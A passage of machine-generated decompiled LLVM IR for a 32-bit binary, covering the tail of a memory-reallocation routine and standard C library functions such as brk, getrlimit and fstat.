dec_label_pc_804cbab:                             ; preds = %dec_label_pc_804cb7f, %dec_label_pc_804cb70, %dec_label_pc_804cb35
  %v1_804cbaf = add i32 %stack_var_-40.0, -7
  store i32 %v1_804cbaf, i32* %eax.global-to-local, align 4
  store i32 %v1_804cbaf, i32* %stack_var_-48, align 4
  %v1_804cbb3 = call i32 @malloc(i32 %v1_804cbaf)
  store i32 %v1_804cbb3, i32* %edx.global-to-local, align 4
  store i32 %v1_804cbaf, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_804cbbd = icmp eq i32 %v1_804cbb3, 0
  br i1 %v1_804cbbd, label %dec_label_pc_804cd6a, label %dec_label_pc_804cbc5

dec_label_pc_804cbc5:                             ; preds = %dec_label_pc_804cbab
  %v1_804cbc5 = add i32 %v1_804cbb3, -8
  store i32 %v1_804cbc5, i32* @ebx, align 4
  %v1_804cbc8 = add i32 %v1_804cbb3, -4
  %v2_804cbc8 = inttoptr i32 %v1_804cbc8 to i32*
  %v3_804cbc8 = load i32, i32* %v2_804cbc8, align 4
  store i32 %v3_804cbc8, i32* %eax.global-to-local, align 4
  %v1_804cbcb = load i32, i32* @esi, align 4
  %v12_804cbcb = icmp eq i32 %v1_804cbc5, %v1_804cbcb
  %v1_804cbcd = icmp eq i1 %v12_804cbcb, false
  br i1 %v1_804cbcd, label %dec_label_pc_804cbd7, label %dec_label_pc_804cbcf

dec_label_pc_804cbcf:                             ; preds = %dec_label_pc_804cbc5
  %v1_804cbcf = and i32 %v3_804cbc8, -4
  store i32 %v1_804cbcf, i32* %eax.global-to-local, align 4
  %v1_804cbd2 = load i32, i32* @ebp, align 4
  %v2_804cbd2 = add i32 %v1_804cbd2, %v1_804cbcf
  store i32 %v2_804cbd2, i32* @ebx, align 4
  br label %dec_label_pc_804cc4d

dec_label_pc_804cbd7:                             ; preds = %dec_label_pc_804cbc5
  %v0_804cbd7 = load i32, i32* @ebp, align 4
  %v1_804cbd7 = add i32 %v0_804cbd7, -4
  store i32 %v1_804cbd7, i32* %eax.global-to-local, align 4
  %v2_804cbdc = udiv i32 %v1_804cbd7, 4
  store i32 %v2_804cbdc, i32* @ecx, align 4
  %v5_804cbdf = icmp ult i32 %v1_804cbd7, 36
  %tmp = and i32 %v1_804cbd7, -4
  %tmp26 = icmp eq i32 %tmp, 36
  %v2_804cbe2 = or i1 %v5_804cbdf, %tmp26
  br i1 %v2_804cbe2, label %dec_label_pc_804cbf4, label %dec_label_pc_804cbe4

dec_label_pc_804cbe4:                             ; preds = %dec_label_pc_804cbd7
  store i32 %v1_804cbd7, i32* %stack_var_-48, align 4
  %v3_804cbea = inttoptr i32 %v1_804cbb3 to i8*
  %v4_804cbea = call i32 @memcpy(i8* %v3_804cbea, i32 %tmp6, i32 %v1_804cbd7)
  store i32 %v4_804cbea, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cc3b

dec_label_pc_804cbf4:                             ; preds = %dec_label_pc_804cbd7
  store i32 %tmp6, i32* @esi, align 4
  %v1_804cbf8 = inttoptr i32 %tmp6 to i32*
  %v2_804cbf8 = load i32, i32* %v1_804cbf8, align 4
  store i32 %v2_804cbf8, i32* %eax.global-to-local, align 4
  %v2_804cbfa = inttoptr i32 %v1_804cbb3 to i32*
  store i32 %v2_804cbf8, i32* %v2_804cbfa, align 4
  %v0_804cbfc = load i32, i32* @esi, align 4
  %v1_804cbfc = add i32 %v0_804cbfc, 4
  %v2_804cbfc = inttoptr i32 %v1_804cbfc to i32*
  %v3_804cbfc = load i32, i32* %v2_804cbfc, align 4
  store i32 %v3_804cbfc, i32* %eax.global-to-local, align 4
  %v2_804cbff = add i32 %v1_804cbb3, 4
  %v3_804cbff = inttoptr i32 %v2_804cbff to i32*
  store i32 %v3_804cbfc, i32* %v3_804cbff, align 4
  %v0_804cc02 = load i32, i32* @esi, align 4
  %v1_804cc02 = add i32 %v0_804cc02, 8
  %v2_804cc02 = inttoptr i32 %v1_804cc02 to i32*
  %v3_804cc02 = load i32, i32* %v2_804cc02, align 4
  store i32 %v3_804cc02, i32* %eax.global-to-local, align 4
  %v2_804cc05 = add i32 %v1_804cbb3, 8
  %v3_804cc05 = inttoptr i32 %v2_804cc05 to i32*
  store i32 %v3_804cc02, i32* %v3_804cc05, align 4
  %v0_804cc08 = load i32, i32* @ecx, align 4
  %tmp21 = icmp ult i32 %v0_804cc08, 5
  br i1 %tmp21, label %dec_label_pc_804cc3b, label %dec_label_pc_804cc0d

dec_label_pc_804cc0d:                             ; preds = %dec_label_pc_804cbf4
  %v0_804cc0d = load i32, i32* @esi, align 4
  %v1_804cc0d = add i32 %v0_804cc0d, 12
  %v2_804cc0d = inttoptr i32 %v1_804cc0d to i32*
  %v3_804cc0d = load i32, i32* %v2_804cc0d, align 4
  store i32 %v3_804cc0d, i32* %eax.global-to-local, align 4
  %v2_804cc10 = add i32 %v1_804cbb3, 12
  %v3_804cc10 = inttoptr i32 %v2_804cc10 to i32*
  store i32 %v3_804cc0d, i32* %v3_804cc10, align 4
  %v0_804cc13 = load i32, i32* @esi, align 4
  %v1_804cc13 = add i32 %v0_804cc13, 16
  %v2_804cc13 = inttoptr i32 %v1_804cc13 to i32*
  %v3_804cc13 = load i32, i32* %v2_804cc13, align 4
  store i32 %v3_804cc13, i32* %eax.global-to-local, align 4
  %v2_804cc16 = add i32 %v1_804cbb3, 16
  %v3_804cc16 = inttoptr i32 %v2_804cc16 to i32*
  store i32 %v3_804cc13, i32* %v3_804cc16, align 4
  %v0_804cc19 = load i32, i32* @ecx, align 4
  %tmp22 = icmp ult i32 %v0_804cc19, 7
  br i1 %tmp22, label %dec_label_pc_804cc3b, label %dec_label_pc_804cc1e

dec_label_pc_804cc1e:                             ; preds = %dec_label_pc_804cc0d
  %v0_804cc1e = load i32, i32* @esi, align 4
  %v1_804cc1e = add i32 %v0_804cc1e, 20
  %v2_804cc1e = inttoptr i32 %v1_804cc1e to i32*
  %v3_804cc1e = load i32, i32* %v2_804cc1e, align 4
  store i32 %v3_804cc1e, i32* %eax.global-to-local, align 4
  %v2_804cc21 = add i32 %v1_804cbb3, 20
  %v3_804cc21 = inttoptr i32 %v2_804cc21 to i32*
  store i32 %v3_804cc1e, i32* %v3_804cc21, align 4
  %v0_804cc24 = load i32, i32* @esi, align 4
  %v1_804cc24 = add i32 %v0_804cc24, 24
  %v2_804cc24 = inttoptr i32 %v1_804cc24 to i32*
  %v3_804cc24 = load i32, i32* %v2_804cc24, align 4
  store i32 %v3_804cc24, i32* %eax.global-to-local, align 4
  %v2_804cc27 = add i32 %v1_804cbb3, 24
  %v3_804cc27 = inttoptr i32 %v2_804cc27 to i32*
  store i32 %v3_804cc24, i32* %v3_804cc27, align 4
  %v0_804cc2a = load i32, i32* @ecx, align 4
  %v9_804cc2a = icmp eq i32 %v0_804cc2a, 9
  %v1_804cc2d = icmp eq i1 %v9_804cc2a, false
  br i1 %v1_804cc2d, label %dec_label_pc_804cc3b, label %dec_label_pc_804cc2f

dec_label_pc_804cc2f:                             ; preds = %dec_label_pc_804cc1e
  %v0_804cc2f = load i32, i32* @esi, align 4
  %v1_804cc2f = add i32 %v0_804cc2f, 28
  %v2_804cc2f = inttoptr i32 %v1_804cc2f to i32*
  %v3_804cc2f = load i32, i32* %v2_804cc2f, align 4
  store i32 %v3_804cc2f, i32* %eax.global-to-local, align 4
  %v2_804cc32 = add i32 %v1_804cbb3, 28
  %v3_804cc32 = inttoptr i32 %v2_804cc32 to i32*
  store i32 %v3_804cc2f, i32* %v3_804cc32, align 4
  %v0_804cc35 = load i32, i32* @esi, align 4
  %v1_804cc35 = add i32 %v0_804cc35, 32
  %v2_804cc35 = inttoptr i32 %v1_804cc35 to i32*
  %v3_804cc35 = load i32, i32* %v2_804cc35, align 4
  store i32 %v3_804cc35, i32* %eax.global-to-local, align 4
  %v2_804cc38 = add i32 %v1_804cbb3, 32
  %v3_804cc38 = inttoptr i32 %v2_804cc38 to i32*
  store i32 %v3_804cc35, i32* %v3_804cc38, align 4
  br label %dec_label_pc_804cc3b

dec_label_pc_804cc3b:                             ; preds = %dec_label_pc_804cc1e, %dec_label_pc_804cc0d, %dec_label_pc_804cbf4, %dec_label_pc_804cbe4, %dec_label_pc_804cc2f
  store i32 %tmp6, i32* %stack_var_-48, align 4
  %v1_804cc3f = call i32 @free(i32 %tmp6)
  store i32 %v1_804cc3f, i32* %eax.global-to-local, align 4
  %v0_804cc44 = load i32, i32* @ebx, align 4
  %v1_804cc44 = add i32 %v0_804cc44, 8
  store i32 %v1_804cc44, i32* @ebx, align 4
  br label %dec_label_pc_804cd6a

dec_label_pc_804cc4d:                             ; preds = %dec_label_pc_804cb1e, %dec_label_pc_804cbcf, %dec_label_pc_804cba0
  %v1_804cc5e = phi i32 [ %v1_804cb12, %dec_label_pc_804cb1e ], [ %v2_804cbd2, %dec_label_pc_804cbcf ], [ %v0_804cc4d.pre, %dec_label_pc_804cba0 ]
  %v5_804cc4f = sub i32 %v1_804cc5e, %stack_var_-40.0
  store i32 %v5_804cc4f, i32* @ecx, align 4
  %tmp23 = icmp ult i32 %v5_804cc4f, 16
  br i1 %tmp23, label %dec_label_pc_804cc58, label %dec_label_pc_804cc6a

dec_label_pc_804cc58:                             ; preds = %dec_label_pc_804cc4d
  %v0_804cc58 = load i32, i32* @edi, align 4
  %v1_804cc58 = add i32 %v0_804cc58, 4
  %v2_804cc58 = inttoptr i32 %v1_804cc58 to i32*
  %v3_804cc58 = load i32, i32* %v2_804cc58, align 4
  %v1_804cc5b = urem i32 %v3_804cc58, 2
  %v2_804cc5e = or i32 %v1_804cc5b, %v1_804cc5e
  store i32 %v2_804cc5e, i32* %eax.global-to-local, align 4
  store i32 %v2_804cc5e, i32* %v2_804cc58, align 4
  %v0_804cc63 = load i32, i32* @ebx, align 4
  %v1_804cc63 = load i32, i32* @edi, align 4
  %v2_804cc63 = add i32 %v0_804cc63, 4
  %v3_804cc63 = add i32 %v2_804cc63, %v1_804cc63
  %v4_804cc63 = inttoptr i32 %v3_804cc63 to i32*
  %v5_804cc63 = load i32, i32* %v4_804cc63, align 4
  %v6_804cc63 = or i32 %v5_804cc63, 1
  store i32 %v6_804cc63, i32* %v4_804cc63, align 4
  br label %dec_label_pc_804cc99

dec_label_pc_804cc6a:                             ; preds = %dec_label_pc_804cc4d
  store i32 %stack_var_-40.0, i32* %edx.global-to-local, align 4
  %v0_804cc6e = load i32, i32* @edi, align 4
  %v2_804cc6e = add i32 %v0_804cc6e, %stack_var_-40.0
  store i32 %v2_804cc6e, i32* %eax.global-to-local, align 4
  %v1_804cc71 = add i32 %v0_804cc6e, 4
  %v2_804cc71 = inttoptr i32 %v1_804cc71 to i32*
  %v3_804cc71 = load i32, i32* %v2_804cc71, align 4
  %v1_804cc74 = urem i32 %v3_804cc71, 2
  %v5_804cc77 = or i32 %v1_804cc74, %stack_var_-40.0
  store i32 %v5_804cc77, i32* @esi, align 4
  store i32 %v5_804cc77, i32* %v2_804cc71, align 4
  %v0_804cc82 = load i32, i32* @ecx, align 4
  %v1_804cc84 = or i32 %v0_804cc82, 1
  store i32 %v1_804cc84, i32* %edx.global-to-local, align 4
  %v1_804cc87 = load i32, i32* %eax.global-to-local, align 4
  %v2_804cc87 = add i32 %v1_804cc87, 4
  %v3_804cc87 = inttoptr i32 %v2_804cc87 to i32*
  store i32 %v1_804cc84, i32* %v3_804cc87, align 4
  %v0_804cc8a = load i32, i32* @ecx, align 4
  %v1_804cc8a = load i32, i32* %eax.global-to-local, align 4
  %v2_804cc8a = add i32 %v0_804cc8a, 4
  %v3_804cc8a = add i32 %v2_804cc8a, %v1_804cc8a
  %v4_804cc8a = inttoptr i32 %v3_804cc8a to i32*
  %v5_804cc8a = load i32, i32* %v4_804cc8a, align 4
  %v6_804cc8a = or i32 %v5_804cc8a, 1
  store i32 %v6_804cc8a, i32* %v4_804cc8a, align 4
  %v0_804cc8f = load i32, i32* %eax.global-to-local, align 4
  %v1_804cc8f = add i32 %v0_804cc8f, 8
  store i32 %v1_804cc8f, i32* %eax.global-to-local, align 4
  store i32 %v1_804cc8f, i32* %stack_var_-48, align 4
  %v1_804cc93 = call i32 @free(i32 %v1_804cc8f)
  store i32 %v1_804cc93, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cc99

dec_label_pc_804cc99:                             ; preds = %dec_label_pc_804cc58, %dec_label_pc_804cc6a
  %v0_804cc99 = load i32, i32* @edi, align 4
  %v1_804cc99 = add i32 %v0_804cc99, 8
  store i32 %v1_804cc99, i32* @ebx, align 4
  br label %dec_label_pc_804cd6a

dec_label_pc_804cca1:                             ; preds = %dec_label_pc_804cb06
  store i32 %tmp6, i32* %eax.global-to-local, align 4
  %v2_804cca5 = inttoptr i32 %v1_804cb0a to i32*
  %v3_804cca5 = load i32, i32* %v2_804cca5, align 4
  store i32 %v3_804cca5, i32* @esi, align 4
  %v0_804cca8 = load i32, i32* @global_var_8055b6c.42, align 4
  %v2_804ccae = or i32 %stack_var_-40.0, 3
  %v3_804ccae = add i32 %v2_804ccae, %v3_804cca5
  %v5_804ccb2 = add i32 %v3_804ccae, %v0_804cca8
  %v1_804ccb6 = sub i32 0, %v0_804cca8
  store i32 %v1_804ccb6, i32* %eax.global-to-local, align 4
  %v2_804ccb8 = and i32 %v5_804ccb2, %v1_804ccb6
  %v2_804ccbe = sub i32 %v2_804ccb8, %v3_804cca5
  store i32 %v2_804ccbe, i32* %edx.global-to-local, align 4
  store i32 %v2_804ccbe, i32* %stack_var_-44, align 4
  store i32 %tmp6, i32* @ebx, align 4
  %v12_804ccc7 = icmp eq i32 %v1_804cb12, %v2_804ccbe
  br i1 %v12_804ccc7, label %dec_label_pc_804cd6a, label %dec_label_pc_804cccf

dec_label_pc_804cccf:                             ; preds = %dec_label_pc_804cca1
  store i32 1, i32* %stack_var_-48, align 4
  %v2_804ccd5 = add i32 %v3_804cca5, %v1_804cb12
  store i32 %v2_804ccd5, i32* %eax.global-to-local, align 4
  %v2_804ccda = sub i32 %v1_804cb0a, %v3_804cca5
  store i32 %v2_804ccda, i32* @edi, align 4
  store i32 %v2_804ccda, i32* %stack_var_-60, align 4
  %v6_804ccdd = call i32 @mremap(i32 %v2_804ccda, i32 %v2_804ccd5, i32 %v2_804ccb8, i32 1, i32 %v2_804ccbe, i32 %v2_804ccb8)
  store i32 %v6_804ccdd, i32* %eax.global-to-local, align 4
  %v10_804cce5 = icmp eq i32 %v6_804ccdd, -1
  br i1 %v10_804cce5, label %dec_label_pc_804cd2d, label %dec_label_pc_804ccea

dec_label_pc_804ccea:                             ; preds = %dec_label_pc_804cccf
  %v1_804ccea = load i32, i32* @esi, align 4
  %v2_804ccea = add i32 %v1_804ccea, %v6_804ccdd
  store i32 %v2_804ccea, i32* %edx.global-to-local, align 4
  %v2_804cced = load i32, i32* %stack_var_-44, align 4
  %v3_804cced = or i32 %v2_804cced, 2
  store i32 %v3_804cced, i32* %stack_var_-44, align 4
  store i32 %v3_804cced, i32* @ecx, align 4
  %v2_804ccf4 = add i32 %v2_804ccea, 4
  %v3_804ccf4 = inttoptr i32 %v2_804ccf4 to i32*
  store i32 %v3_804cced, i32* %v3_804ccf4, align 4
  %v1_804ccfb = load i32, i32* @ebp, align 4
  %v2_804ccfb = sub i32 %v2_804ccb8, %v1_804ccfb
  %v1_804ccfd = load i32, i32* @global_var_8055b74.47, align 4
  %v2_804ccfd = add i32 %v1_804ccfd, %v2_804ccfb
  store i32 %v2_804ccfd, i32* %eax.global-to-local, align 4
  store i32 %v2_804ccfd, i32* @global_var_8055b74.47, align 4
  %v1_804cd08 = load i32, i32* @global_var_8055b80.48, align 128
  %tmp24 = icmp ugt i32 %v2_804ccfd, %v1_804cd08
  br i1 %tmp24, label %dec_label_pc_804cd10, label %dec_label_pc_804cd15

dec_label_pc_804cd10:                             ; preds = %dec_label_pc_804ccea
  store i32 %v2_804ccfd, i32* @global_var_8055b80.48, align 128
  br label %dec_label_pc_804cd15

dec_label_pc_804cd15:                             ; preds = %dec_label_pc_804ccea, %dec_label_pc_804cd10
  %v1_804cd15 = load i32, i32* @global_var_8055b78.49, align 8
  %v2_804cd15 = add i32 %v1_804cd15, %v2_804ccfd
  store i32 %v2_804cd15, i32* %eax.global-to-local, align 4
  %v1_804cd1b = load i32, i32* @global_var_8055b84.50, align 4
  %tmp25 = icmp ugt i32 %v2_804cd15, %v1_804cd1b
  br i1 %tmp25, label %dec_label_pc_804cd23, label %dec_label_pc_804cd28

dec_label_pc_804cd23:                             ; preds = %dec_label_pc_804cd15
  store i32 %v2_804cd15, i32* @global_var_8055b84.50, align 4
  br label %dec_label_pc_804cd28

dec_label_pc_804cd28:                             ; preds = %dec_label_pc_804cd15, %dec_label_pc_804cd23
  %v0_804cd28 = load i32, i32* %edx.global-to-local, align 4
  %v1_804cd28 = add i32 %v0_804cd28, 8
  store i32 %v1_804cd28, i32* @ebx, align 4
  br label %dec_label_pc_804cd6a

dec_label_pc_804cd2d:                             ; preds = %dec_label_pc_804cccf
  %v1_804cd31 = or i32 %stack_var_-40.0, 4
  store i32 %v1_804cd31, i32* %eax.global-to-local, align 4
  store i32 %tmp6, i32* @ebx, align 4
  %v0_804cd38 = load i32, i32* @ebp, align 4
  %v7_804cd38 = icmp ult i32 %v0_804cd38, %v1_804cd31
  %v1_804cd3a = icmp eq i1 %v7_804cd38, false
  br i1 %v1_804cd3a, label %dec_label_pc_804cd6a, label %dec_label_pc_804cd3c

dec_label_pc_804cd3c:                             ; preds = %dec_label_pc_804cd2d
  %v1_804cd40 = add i32 %stack_var_-40.0, -7
  store i32 %v1_804cd40, i32* %eax.global-to-local, align 4
  store i32 %v1_804cd40, i32* %stack_var_-48, align 4
  %v1_804cd44 = call i32 @malloc(i32 %v1_804cd40)
  store i32 %v1_804cd44, i32* %eax.global-to-local, align 4
  store i32 %v1_804cd44, i32* @ebx, align 4
  store i32 %v1_804cd40, i32* @ecx, align 4
  %v1_804cd4c = icmp eq i32 %v1_804cd44, 0
  br i1 %v1_804cd4c, label %dec_label_pc_804cd6a, label %dec_label_pc_804cd50

dec_label_pc_804cd50:                             ; preds = %dec_label_pc_804cd3c
  %v0_804cd50 = load i32, i32* @ebp, align 4
  %v1_804cd50 = add i32 %v0_804cd50, -8
  store i32 %v1_804cd50, i32* %eax.global-to-local, align 4
  store i32 %v1_804cd50, i32* %stack_var_-48, align 4
  %v3_804cd59 = inttoptr i32 %v1_804cd44 to i8*
  %v4_804cd59 = call i32 @memcpy(i8* %v3_804cd59, i32 %tmp6, i32 %v1_804cd50)
  store i32 %v4_804cd59, i32* %eax.global-to-local, align 4
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_804cd62 = call i32 @free(i32 %tmp6)
  store i32 %v1_804cd62, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd6a

dec_label_pc_804cd6a:                             ; preds = %dec_label_pc_804cd3c, %dec_label_pc_804cd2d, %dec_label_pc_804cca1, %dec_label_pc_804cbab, %dec_label_pc_804cd28, %dec_label_pc_804cc99, %dec_label_pc_804cc3b, %dec_label_pc_804cb49, %dec_label_pc_804cd50
  store i32 1, i32* %stack_var_-48, align 4
  store i32 %v2_804cac1, i32* %eax.global-to-local, align 4
  %v3_804cd71 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v2_804cac1, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804cd78

dec_label_pc_804cd78:                             ; preds = %dec_label_pc_804cadd, %dec_label_pc_804cab1, %dec_label_pc_804cd6a
  %v0_804cd78 = load i32, i32* @ebx, align 4
  store i32 %v0_804cd78, i32* %eax.global-to-local, align 4
  store i32 %v0_804ca8b, i32* @ebx, align 4
  store i32 %v0_804ca8a, i32* @esi, align 4
  store i32 %v0_804ca89, i32* @edi, align 4
  store i32 %v0_804ca88, i32* @ebp, align 4
  ret i32 %v0_804cd78

; uselistorder directives
  uselistorder i32 %v1_804cd31, { 1, 0 }
  uselistorder i32 %v2_804cd15, { 1, 0, 2 }
  uselistorder i32 %v2_804ccfd, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_804ccbe, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804ccb8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_804cca8, { 1, 0 }
  uselistorder i32 %v3_804cca5, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v0_804cc6e, { 1, 0 }
  uselistorder i32 %v1_804cbd7, { 3, 2, 0, 4, 1, 5 }
  uselistorder i32 %v1_804cbb3, { 3, 4, 12, 9, 10, 8, 0, 1, 11, 5, 7, 6, 2, 13 }
  uselistorder i32 %v3_804cb70, { 0, 2, 3, 1 }
  uselistorder i32 %v2_804cb2a, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_804cb12, { 0, 5, 6, 1, 2, 3, 4, 8, 7, 9 }
  uselistorder i32 %v1_804cb0a, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 14, 5, 0, 1, 2, 11, 12, 10, 9, 7, 3, 6, 4, 8, 13 }
  uselistorder i32 %v1_804caff, { 1, 0 }
  uselistorder i32 %v1_804caef, { 0, 2, 1 }
  uselistorder i32 %v0_804cad8, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 2, 0, 3 }
  uselistorder i32 %tmp6, { 17, 16, 1, 15, 14, 13, 12, 11, 10, 9, 2, 0, 8, 7, 6, 5, 4, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38, 40, 41, 39, 42, 43, 44, 0, 45, 48, 46, 47, 49, 50, 51 }
  uselistorder i32 ()* @abort, { 4, 0, 3, 2, 1 }
  uselistorder i32* @global_var_805583c.36, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_8053344.33 to i32), { 4, 8, 0, 9, 5, 1, 6, 2, 7, 10, 3, 11 }
  uselistorder label %dec_label_pc_804cd78, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cd6a, { 8, 0, 1, 4, 2, 5, 6, 3, 7 }
  uselistorder label %dec_label_pc_804cd28, { 1, 0 }
  uselistorder label %dec_label_pc_804cd15, { 1, 0 }
  uselistorder label %dec_label_pc_804cc99, { 1, 0 }
  uselistorder label %dec_label_pc_804cc4d, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804cc3b, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804cba0, { 1, 0 }
  uselistorder label %dec_label_pc_804cb06, { 1, 0 }
  uselistorder label %dec_label_pc_804cab1, { 1, 0 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_804cd84 = load i32, i32* @eax, align 4
  %v1_804cd84 = add i32 %v0_804cd84, 28
  %v2_804cd84 = inttoptr i32 %v1_804cd84 to i32*
  %v3_804cd84 = load i32, i32* %v2_804cd84, align 4
  store i32 %v3_804cd84, i32* @global_var_8055b88.99, align 8
  %v1_804cd8d = add i32 %v0_804cd84, 44
  %v2_804cd8d = inttoptr i32 %v1_804cd8d to i32*
  %v3_804cd8d = load i32, i32* %v2_804cd8d, align 4
  store i32 %v3_804cd8d, i32* @global_var_8055b8c.100, align 4
  ret i32 %v3_804cd8d
}

define i32 @__GI_brk(i32* %arg1) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg1 to i32
  %v0_804cda1 = load i32, i32* @ebx, align 4
  %v2_804cda4 = call i32 @brk(i32* %arg1)
  store i32 %v0_804cda1, i32* @ebx, align 4
  store i32 %v2_804cda4, i32* @global_var_80557d0.88, align 16
  store i32 0, i32* @ecx, align 4
  %v7_804cdae = icmp ult i32 %v2_804cda4, %tmp2
  %v1_804cdb0 = icmp eq i1 %v7_804cdae, false
  br i1 %v1_804cdb0, label %dec_label_pc_804cdc0, label %dec_label_pc_804cdb2

dec_label_pc_804cdb2:                             ; preds = %entry
  %v1_804cdb2 = call i32 @__GI___errno_location(i32 %v0_804cda1)
  %v1_804cdb7 = inttoptr i32 %v1_804cdb2 to i32*
  store i32 12, i32* %v1_804cdb7, align 4
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_804cdc0

dec_label_pc_804cdc0:                             ; preds = %entry, %dec_label_pc_804cdb2
  %v0_804cdc0 = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_804cdb2 ]
  ret i32 %v0_804cdc0

; uselistorder directives
  uselistorder i32 %v0_804cda1, { 1, 0 }
  uselistorder i32* @global_var_80557d0.88, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804cdc0, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_804cdc4 = load i32, i32* @ebx, align 4
  %v0_804cdc5 = load i32, i32* @eax, align 4
  %v1_804cdc7 = call i32 @__GI___errno_location(i32 %v0_804cdc4)
  %v1_804cdcc = sub i32 0, %v0_804cdc5
  %v2_804cdce = inttoptr i32 %v1_804cdc7 to i32*
  store i32 %v1_804cdcc, i32* %v2_804cdce, align 4
  ret i32 -1
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804cdd8 = load i32, i32* @ebx, align 4
  store i32 %v0_804cdd8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804cde8 = call i32 @int80_syscall(i32 191)
  store i32 %v1_804cde8, i32* %ebx.global-to-local, align 4
  %tmp5 = icmp ult i32 %v1_804cde8, -4095
  br i1 %tmp5, label %dec_label_pc_804ce02, label %dec_label_pc_804cdf6

dec_label_pc_804cdf6:                             ; preds = %entry
  %v0_804cdf6 = load i32, i32* %stack_var_-4, align 4
  %v1_804cdf6 = call i32 @__GI___errno_location(i32 %v0_804cdf6)
  %v0_804cdfb = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cdfb = sub i32 0, %v0_804cdfb
  store i32 %v1_804cdfb, i32* %ebx.global-to-local, align 4
  %v2_804cdfd = inttoptr i32 %v1_804cdf6 to i32*
  store i32 %v1_804cdfb, i32* %v2_804cdfd, align 4
  br label %dec_label_pc_804ce02

dec_label_pc_804ce02:                             ; preds = %entry, %dec_label_pc_804cdf6
  %v0_804ce03 = phi i32 [ %v1_804cde8, %entry ], [ -1, %dec_label_pc_804cdf6 ]
  %v2_804ce02 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ce02, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804ce03

; uselistorder directives
  uselistorder i32 %v1_804cde8, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ce02, { 1, 0 }
}

define i32 @fstat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ce04 = load i32, i32* @ebx, align 4
  store i32 %v0_804ce04, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_804ce15 = call i32 @fstat(i32 %v0_804ce04, i32 %tmp3)
  store i32 %v2_804ce15, i32* @ebx, align 4
  %tmp9 = icmp ult i32 %v2_804ce15, -4095
  br i1 %tmp9, label %dec_label_pc_804ce30, label %dec_label_pc_804ce22

dec_label_pc_804ce22:                             ; preds = %entry
  %v1_804ce22 = call i32 @__GI___errno_location(i32 %v0_804ce04)
  %v0_804ce27 = load i32, i32* @ebx, align 4
  %v1_804ce27 = sub i32 0, %v0_804ce27
  %v2_804ce29 = inttoptr i32 %v1_804ce22 to i32*
  store i32 %v1_804ce27, i32* %v2_804ce29, align 4
  %v2_804ce45.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804ce40

dec_label_pc_804ce30:                             ; preds = %entry
  %v1_804ce30 = icmp eq i32 %v2_804ce15, 0
  %v1_804ce32 = icmp eq i1 %v1_804ce30, false
  br i1 %v1_804ce32, label %dec_label_pc_804ce40, label %dec_label_pc_804ce34

dec_label_pc_804ce34:                             ; preds = %dec_label_pc_804ce30
  %v3_804ce39 = call i32 @__xstat_conv(i32* nonnull %stack_var_-68, i32 %arg2)
  %v0_804ce40.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ce40

dec_label_pc_804ce40:                             ; preds = %dec_label_pc_804ce30, %dec_label_pc_804ce22, %dec_label_pc_804ce34
  %v2_804ce45 = phi i32 [ %v0_804ce04, %dec_label_pc_804ce30 ], [ %v2_804ce45.pre, %dec_label_pc_804ce22 ], [ %v0_804ce04, %dec_label_pc_804ce34 ]
  %v0_804ce40 = phi i32 [ %v2_804ce15, %dec_label_pc_804ce30 ], [ -1, %dec_label_pc_804ce22 ], [ %v0_804ce40.pre, %dec_label_pc_804ce34 ]
  store i32 %v2_804ce45, i32* @ebx, align 4
  ret i32 %v0_804ce40

; uselistorder directives
  uselistorder i32 %v2_804ce15, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32)* @fstat, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ce40, { 2, 0, 1 }
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
